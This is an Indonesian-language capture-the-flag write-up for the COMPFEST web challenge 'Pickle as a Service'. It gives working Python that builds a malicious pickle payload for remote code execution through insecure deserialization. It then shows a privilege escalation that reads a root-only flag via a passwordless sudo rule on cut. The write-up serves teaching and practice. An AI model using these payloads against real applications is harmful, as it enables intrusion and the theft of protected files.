# Write-up: CTF COMPFEST - Pickle as a Service (Web)

## Informasi Soal

* **Nama Soal:** Pickle as a Service
* **Kategori:** Web
* **Author:** Karev

## Ringkasan (TL;DR)

Soal ini mengeksploitasi kerentanan Python "insecure deserialization" melalui modul `pickle`. Fitur unpickle pada aplikasi web memungkinkan eksekusi kode jarak jauh (RCE). Flag berada di file `flag.txt` yang hanya bisa diakses oleh `root`, namun bisa diambil dengan memanfaatkan hak akses sudo pada perintah `cut` milik user `ctfuser`.

## Tahapan Eksploitasi

### 1. Identifikasi Kerentanan & RCE Awal ⚖️

Aplikasi web memungkinkan input pickle dalam bentuk Base64 yang akan di-*unpickle* langsung di server. Kita bisa mengirimkan payload Python yang menggunakan `__reduce__` untuk mengeksekusi perintah sistem.

**Payload untuk RCE (ls /):**

```python
import pickle, base64, subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (["ls", "/"],))

payload = pickle.dumps(Exploit(), protocol=4)
print(base64.b64encode(payload).decode())
```

### 2. Jalan Buntu: Gagal Akses /flag.txt ❌

Setelah menemukan file `flag.txt` di direktori root, mencoba `cat /flag.txt` gagal:

```
Command '['cat', '/flag.txt']' returned non-zero exit status 1.
```

Pemeriksaan hak akses:

```
-rw------- 1 root root 172 Aug  1 15:00 /flag.txt
```

File hanya bisa dibaca oleh root. Web server berjalan bukan sebagai root.

### 3. Enumerasi Sistem 🗺️

Melakukan eksplorasi direktori `/ctf`:

* Menemukan `requirements.txt` dengan `Flask==2.3.3`
* Melihat source code di `/ctf/app/app.py`, namun tidak ditemukan flag

### 4. Petunjuk User: ctfuser 🕵️

Menjalankan perintah `env`, ditemukan:

```
HOME=/home/ctfuser
```

Menandakan adanya user lain bernama `ctfuser`.

### 5. Jejak Digital: .bash\_history 📜

Membaca isi `/home/ctfuser/.bash_history`:

```
...
cat flag.txt
sudo -l
...
```

Perintah `sudo -l` adalah kunci.

### 6. Eskalasi Hak Akses 🏆

Menjalankan `sudo -l`:

```
User ctfuser may run the following commands on 62cbace086e3:
    (ALL) NOPASSWD: /usr/bin/cut
```

Berarti kita bisa menjalankan `cut` sebagai root tanpa password. Gunakan opsi `-c 1-` untuk mengambil seluruh isi file:

### 7. Payload Final untuk Ambil Flag

```python
import pickle, base64, subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (["sudo", "/usr/bin/cut", "-c", "1-", "/flag.txt"],))

payload = pickle.dumps(Exploit(), protocol=4)
print(base64.b64encode(payload).decode())
```

**Masukkan Base64 hasil output script di atas ke form "Open the Jar"**, flag akan muncul pada bagian hasil `Recovered Ingredients`.

---

## Kesimpulan

Soal ini menekankan pentingnya tidak membiarkan `pickle.loads()` menerima input dari user tanpa validasi. Eksploitasi dilakukan dengan:

* Menyisipkan payload `__reduce__`
* Melakukan enumerasi file dan environment
* Memanfaatkan hak akses sudo pada `cut` untuk membaca file rahasia

🚀 **Eksploitasi selesai. Flag berhasil diambil!**
